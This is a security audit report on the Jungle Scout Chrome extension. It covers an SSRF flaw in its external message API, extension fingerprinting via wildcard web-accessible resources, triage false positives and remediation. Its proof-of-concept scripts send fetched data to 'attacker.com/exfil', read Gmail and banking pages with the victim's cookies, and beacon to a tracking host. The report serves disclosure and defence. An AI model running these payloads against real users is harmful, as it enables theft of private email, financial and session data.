# Vulnerability Report: Jungle Scout (bckjlihkmgolmgkchbpiponapgjenaoa)

**Extension:** Jungle Scout v9.2.6
**ID:** bckjlihkmgolmgkchbpiponapgjenaoa
**Manifest Version:** 3
**Analysis Date:** 2026-02-06
**Triage Flags:** V1=5, V2=5 -- innerhtml_dynamic, postmessage_no_origin, dynamic_window_open

---

## Executive Summary

The Jungle Scout Chrome extension exposes a rich `externally_connectable` message API that can be reached by any page on `junglescout.com`, `junglescout.cn`, `dev-junglescout.com`, or `localhost`, as well as by **any other installed extension** (`"ids": ["*"]`). This API includes a Server-Side Request Forgery (SSRF) primitive and an overly broad `web_accessible_resources` wildcard that enables extension fingerprinting. One verified vulnerability of medium severity was identified, along with one low-severity design weakness.

Multiple triage flags (innerHTML, postMessage, window.open) were investigated and found to be **false positives** from bundled libraries (React, styled-components, ProseMirror, react-csv, DataDome captcha handler with proper origin check).

---

## Vulnerability 1: SSRF via `GET_SEARCH_RESULTS` External Message Handler

### Title
Arbitrary URL Fetch (SSRF) via Externally Connectable `getSearchResults` Message

### CVSS 3.1
**Score: 5.4 (Medium)**
Vector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N`

- **AV:N** -- Attacker-controlled web page triggers the exploit.
- **AC:L** -- No special conditions; the external message API is always available.
- **PR:N** -- No authentication required from the attacker.
- **UI:R** -- Victim must navigate to an attacker-controlled page on a matching domain (or any page if exploited via a malicious extension).
- **S:U** -- Scope unchanged; the fetch occurs within the extension's service worker context.
- **C:L** -- Response data from the fetched URL is returned to the caller, enabling limited information disclosure.
- **I:L** -- The extension makes arbitrary HTTP requests on behalf of the user, carrying the user's cookies and session for the target domain.
- **A:N** -- No availability impact.

### Location
**File:** `js/background/index.js`
**Lines:** 27056-27057 (external message handler), 25254-25286 (Ym function)

### Description

The background service worker registers an `onMessageExternal` listener at line 27035 that handles messages from web pages matching the `externally_connectable.matches` patterns in the manifest. The `GET_SEARCH_RESULTS` case at line 27057 accepts a `url` parameter from the external message and passes it directly to the `Ym()` function:

```javascript
// Line 27056-27057
case s.Zt.GET_SEARCH_RESULTS:
  return Wm(Ym(e.url), 2e4).then(r), !0;
```

The `Ym()` function at line 25254-25286 performs an unrestricted `fetch()` to the provided URL:

```javascript
// Line 25260
return e.prev = 0, e.next = 1, fetch(t).then((function(e) {
  return e.text()
}));
```

There is **no validation** of the URL parameter -- no domain allowlist, no protocol check, no URL sanitization. The extension has `host_permissions: ["https://*/*"]`, so the service worker's `fetch()` carries the user's cookies for any HTTPS domain.

The fetched HTML response is parsed by a DOMParser-like implementation and the extracted structured data (product listings, pagination) is returned to the caller via the `r()` callback.

### Externally Connectable Scope

From `manifest.json` lines 60-70:
```json
"externally_connectable": {
  "ids": ["*"],
  "matches": [
    "*://*.junglescout.com/*",
    "*://*.junglescout.cn/*",
    "*://*.dev-junglescout.com/*",
    "*://localhost/*"
  ]
}
```

**Attack surfaces:**
1. **Any subdomain** of `junglescout.com`, `junglescout.cn`, or `dev-junglescout.com` (XSS on any subdomain = full exploit).
2. **`localhost`** on any port (local development servers, or attackers exploiting DNS rebinding).
3. **Any installed Chrome extension** (`"ids": ["*"]`) can send messages -- a malicious or compromised extension gains SSRF capability.

### PoC Exploit Scenario

**Scenario A: XSS on any junglescout.com subdomain**

If an attacker finds an XSS vulnerability on any subdomain of `junglescout.com` (e.g., `blog.junglescout.com`, `help.junglescout.com`), they can execute:

```javascript
// From an XSS payload on *.junglescout.com
chrome.runtime.sendMessage(
  "bckjlihkmgolmgkchbpiponapgjenaoa",
  {
    type: "getSearchResults",
    url: "https://internal-admin.junglescout.com/api/users?limit=100"
  },
  function(response) {
    // Exfiltrate internal API data via the extension's cookie-bearing fetch
    fetch("https://attacker.com/exfil", {
      method: "POST",
      body: JSON.stringify(response)
    });
  }
);
```

**Scenario B: Malicious extension**

Any extension installed alongside Jungle Scout can exploit this because `ids: ["*"]`:

```javascript
// From any other extension's background script
chrome.runtime.sendMessage(
  "bckjlihkmgolmgkchbpiponapgjenaoa",
  {
    type: "getSearchResults",
    url: "https://mail.google.com/mail/u/0/"
  },
  function(response) {
    // The fetch is made with the user's Google cookies
    // Response contains the user's email inbox HTML
    console.log(response);
  }
);
```

**Scenario C: localhost exploitation**

A page running on `localhost` (e.g., a malicious local web app or DNS rebinding attack) can use the extension as a proxy to fetch any HTTPS URL with the user's cookies:

```javascript
// From http://localhost:8080
chrome.runtime.sendMessage(
  "bckjlihkmgolmgkchbpiponapgjenaoa",
  {
    type: "getSearchResults",
    url: "https://bank.example.com/account/summary"
  },
  function(response) {
    // Banking data returned via the extension's privileged fetch
  }
);
```

### Impact

- **Information Disclosure:** The extension's service worker `fetch()` operates with `host_permissions: https://*/*`, meaning it can access any HTTPS URL with the user's session cookies. An attacker can read cross-origin responses that would normally be blocked by the browser's Same-Origin Policy.
- **Session Hijacking Potential:** If the fetched URL returns session tokens, CSRF tokens, or other sensitive data in HTML, the attacker receives this data.
- **Internal Network Scanning:** The extension can be used to probe internal/intranet HTTPS services accessible from the user's machine.

### Remediation

1. **Validate the URL parameter** in the `GET_SEARCH_RESULTS` handler to only allow Amazon domains:
   ```javascript
   const allowedDomains = /^https:\/\/www\.amazon\.(com|co\.uk|ca|de|fr|co\.jp|in|com\.mx|com\.br|com\.au|nl|sg|sa|ae|se|pl|eg|tr)(\/.*)$/;
   if (!allowedDomains.test(e.url)) return r({error: "Invalid URL"}), true;
   ```
2. **Remove `"ids": ["*"]`** from `externally_connectable` or restrict to specific known extension IDs.
3. **Remove `*://localhost/*`** from production builds' `externally_connectable.matches`.

---

## Vulnerability 2: Universal Web-Accessible Resources Enable Extension Fingerprinting

### Title
Extension Fingerprinting via Wildcard `web_accessible_resources`

### CVSS 3.1
**Score: 3.1 (Low)**
Vector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N`

### Location
**File:** `manifest.json`
**Lines:** 38-48

### Description

The manifest declares:
```json
"web_accessible_resources": [{
  "resources": ["*"],
  "matches": ["<all_urls>"],
  "extension_ids": []
}]
```

This exposes **every file** in the extension package (JavaScript source, images, fonts, internal HTML pages) to **any web page**. Any website can probe for the extension's existence by attempting to load a known resource URL like `chrome-extension://bckjlihkmgolmgkchbpiponapgjenaoa/images/active.png`.

### PoC Exploit Scenario

```javascript
// Any web page can detect if Jungle Scout is installed
const img = new Image();
img.onload = () => {
  // Extension is installed -- user is an Amazon seller
  // Target them with tailored phishing or competitor intelligence
  fetch("https://attacker.com/track?ext=junglescout&installed=true");
};
img.onerror = () => { /* not installed */ };
img.src = "chrome-extension://bckjlihkmgolmgkchbpiponapgjenaoa/images/128.png";
```

### Impact

- **Privacy:** Any website can determine if the user has Jungle Scout installed, revealing they are likely an Amazon seller/researcher.
- **Targeted Attacks:** Knowledge of installed extensions enables targeted phishing campaigns (e.g., fake Jungle Scout login pages).
- **Source Code Exposure:** All JS files are accessible, aiding attackers in finding additional vulnerabilities.

### Remediation

Restrict `web_accessible_resources` to only files that must be accessible to web pages, and limit `matches` to specific domains if possible:
```json
"web_accessible_resources": [{
  "resources": ["images/active.png"],
  "matches": ["*://*.amazon.com/*", "*://*.amazon.co.uk/*"]
}]
```

---

## False Positives (Triage Flag Analysis)

### innerHTML with Dynamic Content
All `innerHTML` assignments traced to:
- **React runtime** (`_0bc0478e.js:18257`) -- SVG namespace innerHTML fallback (standard React DOM reconciliation)
- **Styled-components** (`_27545368.js:21482`) -- `dangerouslySetInnerHTML` for CSS style injection from `e.instance.toString()`
- **ProseMirror editor** (`_0bc0478e.js:14060`) -- clipboard handling with Trusted Types policy `ProseMirrorClipboard`
- **LinkedOM/server-side DOM** (`background/index.js:14259, 16636-16789, 17669-17803`) -- Virtual DOM implementation getters/setters in the service worker
- **HTML entity decoder** (`_536eaa00.js:7217`) -- Standard `"&" + entityName + ";"` pattern for HTML entity resolution
- **Amazon page scraping** (`background/index.js:22326, 22563, 22923`) -- Reading `.innerHTML` property from parsed DOM elements (read-only, not write)

**Verdict:** All false positives. No user-controlled data flows into innerHTML assignments.

### postMessage Without Origin Check
- **DataDome captcha handler** (`_53027715.js:8475-8489`) -- Actually **does check origin**: `if ("https://geo.captcha-delivery.com" === t)` at line 8478. This is a **false positive**.
- **MessageChannel scheduler** (`_27545368.js:20574`) -- React scheduler internal MessageChannel for `postMessage(null)` microtask scheduling. Not a cross-origin message handler. **False positive.**
- **WebSocket message listener** (`background/index.js:26913`) -- `addEventListener("message", ug)` on a WebSocket object to `wss://ws.ext-xs-prod.junglescout.com`. WebSocket messages are not cross-origin postMessages. **False positive.**

### Dynamic window.open
- **react-csv library** (`_0bc0478e.js:15856`) -- `window.open(this.buildURI(t, i, n, r, o), s, l, a)` for CSV export downloads. URI is built from local data (CSV content), not external input. **False positive.**
- **Fallback tab opener** (`extension.js:1773`, `background/index.js:10875`, `_e96e9bea.js:2561`) -- `n().tabs ? n().tabs.create({url: e}) : window.open(e)` as a fallback when the Chrome tabs API is unavailable. The URL comes from internal extension logic. **False positive.**
- **Support link** (`_53027715.js:17756`) -- `window.open(Y.FO)` where `Y.FO` is a static constant. **False positive.**

---

## Summary Table

| # | Vulnerability | Severity | CVSS | File:Line | Status |
|---|---|---|---|---|---|
| 1 | SSRF via GET_SEARCH_RESULTS | Medium | 5.4 | background/index.js:27057 | **VERIFIED** |
| 2 | Extension Fingerprinting via WAR wildcard | Low | 3.1 | manifest.json:38-48 | **VERIFIED** |
| - | innerHTML dynamic (all instances) | - | - | Multiple | FALSE POSITIVE |
| - | postMessage no origin check | - | - | _53027715.js:8475 | FALSE POSITIVE (origin IS checked) |
| - | dynamic window.open | - | - | Multiple | FALSE POSITIVE |
